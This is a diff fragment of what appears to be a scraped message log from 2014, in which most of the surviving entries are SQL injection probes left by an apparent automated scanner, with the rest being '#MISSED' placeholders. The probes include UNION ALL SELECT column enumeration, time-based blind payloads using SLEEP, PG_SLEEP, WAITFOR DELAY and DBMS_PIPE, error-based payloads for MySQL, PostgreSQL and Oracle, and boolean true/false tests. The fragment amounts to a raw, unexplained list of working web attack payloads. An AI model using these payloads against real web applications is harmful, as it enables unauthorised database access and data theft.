+
+#p 3944 2014-02-15 15:59:00 -1 -1
+#MISSED
+
 #p 3943 2014-02-15 15:59:00 0 0
 sadd') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#(from web版http://rrurl.cn/ohgiky )
+
+#p 3942 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3941 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3940 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3939 2014-02-15 15:59:00 -1 -1
+#MISSED
 
 #p 3938 2014-02-15 15:59:00 0 0
 sadd') UNION ALL SELECT NULL,NULL,NULL,NULL#(from web版http://rrurl.cn/ohgiky )
@@ -457,17 +1102,62 @@ sadd') UNION ALL SELECT NULL,NULL,NULL#(from web版http://rrurl.cn/ohgiky )
 #p 3936 2014-02-15 15:59:00 0 0
 sadd') UNION ALL SELECT NULL#(from web版http://rrurl.cn/ohgiky )
 
+#p 3935 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3934 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3933 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3932 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3931 2014-02-15 15:59:00 -1 -1
+#MISSED
+
 #p 3930 2014-02-15 15:59:00 0 0
 sadd UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#(from web版http://rrurl.cn/ohgiky )
+
+#p 3929 2014-02-15 15:59:00 -1 -1
+#MISSED
 
 #p 3928 2014-02-15 15:59:00 0 0
 sadd UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#(from web版http://rrurl.cn/ohgiky )
 
+#p 3927 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3926 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3925 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3924 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3923 2014-02-15 15:59:00 -1 -1
+#MISSED
+
 #p 3922 2014-02-15 15:59:00 0 0
 sadd ORDER BY 1#(from web版http://rrurl.cn/ohgiky )
 
+#p 3921 2014-02-15 15:59:00 -1 -1
+#MISSED
+
 #p 3920 2014-02-15 15:59:00 0 0
 sadd) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#(from web版http://rrurl.cn/ohgiky )
+
+#p 3919 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3918 2014-02-15 15:59:00 -1 -1
+#MISSED
+
+#p 3917 2014-02-15 15:59:00 -1 -1
+#MISSED
 
 #p 3916 2014-02-15 15:58:00 0 0
 sadd) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#(from web版http://rrurl.cn/ohgiky )
@@ -475,35 +1165,116 @@ sadd) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#(from web版http://rrurl.cn/ohgi
 #p 3915 2014-02-15 15:58:00 0 0
 sadd) UNION ALL SELECT NULL,NULL,NULL,NULL#(from web版http://rrurl.cn/ohgiky )
 
+#p 3914 2014-02-15 15:58:00 -1 -1
+#MISSED
+
+#p 3913 2014-02-15 15:58:00 -1 -1
+#MISSED
+
 #p 3912 2014-02-15 15:58:00 0 0
 sadd) UNION ALL SELECT NULL#(from web版http://rrurl.cn/ohgiky )
 
-#p 3906 2014-02-15 15:58:00 0 0
-sadd AND 4541=DBMS_PIPE.RECEIVE_MESSAGE(CHR(86)||CHR(67)||CHR(111)||CHR(78),5)(from web版http://rrurl.cn/ohgiky )
+#p 3911 2014-02-15 15:58:00 -1 -1
+#MISSED
+
+#p 3910 2014-02-15 15:58:00 -1 -1
+#MISSED
+
+#p 3909 2014-02-15 15:58:00 -1 -1
+#MISSED
+
+#p 3908 2014-02-15 15:58:00 -1 -1
+#MISSED
 
 #p 3907 2014-02-15 15:58:00 0 0
 sadd') AND 4541=DBMS_PIPE.RECEIVE_MESSAGE(CHR(86)||CHR(67)||CHR(111)||CHR(78),5) AND ('njzx'='njzx(from web版http://rrurl.cn/ohgiky )
 
+#p 3906 2014-02-15 15:58:00 0 0
+sadd AND 4541=DBMS_PIPE.RECEIVE_MESSAGE(CHR(86)||CHR(67)||CHR(111)||CHR(78),5)(from web版http://rrurl.cn/ohgiky )
+
+#p 3905 2014-02-15 15:58:00 -1 -1
+#MISSED
+
 #p 3904 2014-02-15 15:58:00 0 0
 sadd%' WAITFOR DELAY '0:0:5'--(from web版http://rrurl.cn/ohgiky )
+
+#p 3903 2014-02-15 15:58:00 -1 -1
+#MISSED
+
+#p 3902 2014-02-15 15:58:00 -1 -1
+#MISSED
+
+#p 3901 2014-02-15 15:58:00 -1 -1
+#MISSED
+
+#p 3900 2014-02-15 15:58:00 -1 -1
+#MISSED
+
+#p 3899 2014-02-15 15:58:00 -1 -1
+#MISSED
 
 #p 3898 2014-02-15 15:58:00 0 0
 sadd' AND 7513=(SELECT 7513 FROM PG_SLEEP(5)) AND 'uyia'='uyia(from web版http://rrurl.cn/ohgiky )
 
+#p 3897 2014-02-15 15:58:00 -1 -1
+#MISSED
+
+#p 3896 2014-02-15 15:58:00 -1 -1
+#MISSED
+
 #p 3895 2014-02-15 15:58:00 0 0
 sadd) AND 7513=(SELECT 7513 FROM PG_SLEEP(5)) AND (3915=3915(from web版http://rrurl.cn/ohgiky )
+
+#p 3894 2014-02-15 15:58:00 -1 -1
+#MISSED
+
+#p 3893 2014-02-15 15:58:00 -1 -1
+#MISSED
+
+#p 3892 2014-02-15 15:58:00 -1 -1
+#MISSED
 
 #p 3891 2014-02-15 15:58:00 0 0
 sadd AND SLEEP(5)(from web版http://rrurl.cn/ohgiky )
 
+#p 3890 2014-02-15 15:58:00 -1 -1
+#MISSED
+
+#p 3889 2014-02-15 15:58:00 -1 -1
+#MISSED
+
 #p 3888 2014-02-15 15:58:00 0 0
 sadd'; WAITFOR DELAY '0:0:5'--(from web版http://rrurl.cn/ohgiky )
+
+#p 3887 2014-02-15 15:58:00 -1 -1
+#MISSED
+
+#p 3886 2014-02-15 15:58:00 -1 -1
+#MISSED
+
+#p 3885 2014-02-15 15:58:00 -1 -1
+#MISSED
 
 #p 3884 2014-02-15 15:58:00 0 0
 sadd%'; SELECT PG_SLEEP(5)--(from web版http://rrurl.cn/ohgiky )
 
+#p 3883 2014-02-15 15:58:00 -1 -1
+#MISSED
+
 #p 3882 2014-02-15 15:58:00 0 0
 sadd'); SELECT PG_SLEEP(5)--(from web版http://rrurl.cn/ohgiky )
+
+#p 3881 2014-02-15 15:58:00 -1 -1
+#MISSED
+
+#p 3880 2014-02-15 15:58:00 -1 -1
+#MISSED
+
+#p 3879 2014-02-15 15:58:00 -1 -1
+#MISSED
+
+#p 3878 2014-02-15 15:58:00 -1 -1
+#MISSED
 
 #p 3877 2014-02-15 15:58:00 0 0
 sadd'); SELECT SLEEP(5)-- (from web版http://rrurl.cn/ohgiky )
@@ -511,8 +1282,26 @@ sadd'); SELECT SLEEP(5)-- (from web版http://rrurl.cn/ohgiky )
 #p 3876 2014-02-15 15:58:00 0 0
 sadd; SELECT SLEEP(5)-- (from web版http://rrurl.cn/ohgiky )
 
+#p 3875 2014-02-15 15:58:00 -1 -1
+#MISSED
+
 #p 3874 2014-02-15 15:58:00 0 0
 SELECT ':vsc:'||(SELECT (CASE WHEN (4342=4342) THEN 1 ELSE 0 END))||':jkk:'(from web版http://rrurl.cn/ohgiky )
+
+#p 3873 2014-02-15 15:58:00 -1 -1
+#MISSED
+
+#p 3872 2014-02-15 15:58:00 -1 -1
+#MISSED
+
+#p 3871 2014-02-15 15:58:00 -1 -1
+#MISSED
+
+#p 3870 2014-02-15 15:58:00 -1 -1
+#MISSED
+
+#p 3869 2014-02-15 15:58:00 -1 -1
+#MISSED
 
 #p 3868 2014-02-15 15:58:00 0 0
 sadd' AND 6151=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(118)||CHR(115)||CHR(99)||CHR(58)||(SELECT (CASE WHEN (6151=6151) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(106)||CHR(107)||CHR(107)||CHR(58)||CHR(62))) FROM DUAL) AND 'svKY'='svKY(from web版http://rrurl.cn/ohgiky )
@@ -520,8 +1309,26 @@ sadd' AND 6151=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(118)||CHR(115)||CHR(9
 #p 3867 2014-02-15 15:58:00 0 0
 sadd') AND 6151=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(118)||CHR(115)||CHR(99)||CHR(58)||(SELECT (CASE WHEN (6151=6151) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(106)||CHR(107)||CHR(107)||CHR(58)||CHR(62))) FROM DUAL) AND ('iLFw'='iLFw(from web版http://rrurl.cn/ohgiky )
 
+#p 3866 2014-02-15 15:58:00 -1 -1
+#MISSED
+
 #p 3865 2014-02-15 15:58:00 0 0
 sadd) AND 6151=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(118)||CHR(115)||CHR(99)||CHR(58)||(SELECT (CASE WHEN (6151=6151) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(106)||CHR(107)||CHR(107)||CHR(58)||CHR(62))) FROM DUAL) AND (7392=7392(from web版http://rrurl.cn/ohgiky )
+
+#p 3864 2014-02-15 15:58:00 -1 -1
+#MISSED
+
+#p 3863 2014-02-15 15:58:00 -1 -1
+#MISSED
+
+#p 3862 2014-02-15 15:58:00 -1 -1
+#MISSED
+
+#p 3861 2014-02-15 15:58:00 -1 -1
+#MISSED
+
+#p 3860 2014-02-15 15:58:00 -1 -1
+#MISSED
 
 #p 3859 2014-02-15 15:58:00 0 0
 sadd%' AND 6811=CAST((CHR(58)||CHR(118)||CHR(115)||CHR(99)||CHR(58))||(SELECT (CASE WHEN (6811=6811) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(106)||CHR(107)||CHR(107)||CHR(58)) AS NUMERIC) AND '%'='(from web版http://rrurl.cn/ohgiky )
@@ -529,17 +1336,41 @@ sadd%' AND 6811=CAST((CHR(58)||CHR(118)||CHR(115)||CHR(99)||CHR(58))||(SELECT (C
 #p 3858 2014-02-15 15:58:00 0 0
 sadd' AND 6811=CAST((CHR(58)||CHR(118)||CHR(115)||CHR(99)||CHR(58))||(SELECT (CASE WHEN (6811=6811) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(106)||CHR(107)||CHR(107)||CHR(58)) AS NUMERIC) AND 'Tohi'='Tohi(from web版http://rrurl.cn/ohgiky )
 
+#p 3857 2014-02-15 15:58:00 -1 -1
+#MISSED
+
 #p 3856 2014-02-15 15:58:00 0 0
 sadd AND 6811=CAST((CHR(58)||CHR(118)||CHR(115)||CHR(99)||CHR(58))||(SELECT (CASE WHEN (6811=6811) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(106)||CHR(107)||CHR(107)||CHR(58)) AS NUMERIC)(from web版http://rrurl.cn/ohgiky )
+
+#p 3855 2014-02-15 15:58:00 -1 -1
+#MISSED
+
+#p 3854 2014-02-15 15:58:00 -1 -1
+#MISSED
+
+#p 3853 2014-02-15 15:58:00 -1 -1
+#MISSED
 
 #p 3852 2014-02-15 15:58:00 0 0
 sadd') AND (SELECT 1834 FROM(SELECT COUNT(*),CONCAT(0x3a7673633a,(SELECT (CASE WHEN (1834=1834) THEN 1 ELSE 0 END)),0x3a6a6b6b3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('AbRY'='AbRY(from web版http://rrurl.cn/ohgiky )
 
+#p 3851 2014-02-15 15:58:00 -1 -1
+#MISSED
+
 #p 3850 2014-02-15 15:58:00 0 0
 sadd) AND (SELECT 1834 FROM(SELECT COUNT(*),CONCAT(0x3a7673633a,(SELECT (CASE WHEN (1834=1834) THEN 1 ELSE 0 END)),0x3a6a6b6b3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (8506=8506(from web版http://rrurl.cn/ohgiky )
 
+#p 3849 2014-02-15 15:58:00 -1 -1
+#MISSED
+
+#p 3848 2014-02-15 15:58:00 -1 -1
+#MISSED
+
 #p 3847 2014-02-15 15:58:00 0 0
 sadd%' AND 7049=6414 AND '%'='(from web版http://rrurl.cn/ohgiky )
+
+#p 3846 2014-02-15 15:58:00 -1 -1
+#MISSED
 
 #p 3845 2014-02-15 15:58:00 0 0
 sadd' AND 4313=4313 AND 'ORWw'='ORWw(from web版http://rrurl.cn/ohgiky )
@@ -553,6 +1384,9 @@ sadd') AND 4468=1929 AND ('omdu'='omdu(from web版http://rrurl.cn/ohgiky )
 #p 3842 2014-02-15 15:58:00 0 0
 sadd') AND 4313=4313 AND ('Efiv'='Efiv(from web版http://rrurl.cn/ohgiky )
 
+#p 3841 2014-02-15 15:58:00 -1 -1
+#MISSED
+
 #p 3840 2014-02-15 15:58:00 0 0
 sadd AND 1342=1863(from web版http://rrurl.cn/ohgiky )
 
@@ -561,6 +1395,12 @@ sadd AND 4313=4313(from web版http://rrurl.cn/ohgiky )
 
 #p 3838 2014-02-15 15:58:00 0 0
 sadd AND 9962=5605(from web版http://rrurl.cn/ohgiky )
+
+#p 3837 2014-02-15 15:58:00 -1 -1
+#MISSED
+
+#p 3836 2014-02-15 15:58:00 -1 -1
+#MISSED
 
 #p 3835 2014-02-15 15:58:00 0 0
 sadd) AND 5447=9266 AND (5136=5136(from web版http://rrurl.cn/ohgiky )
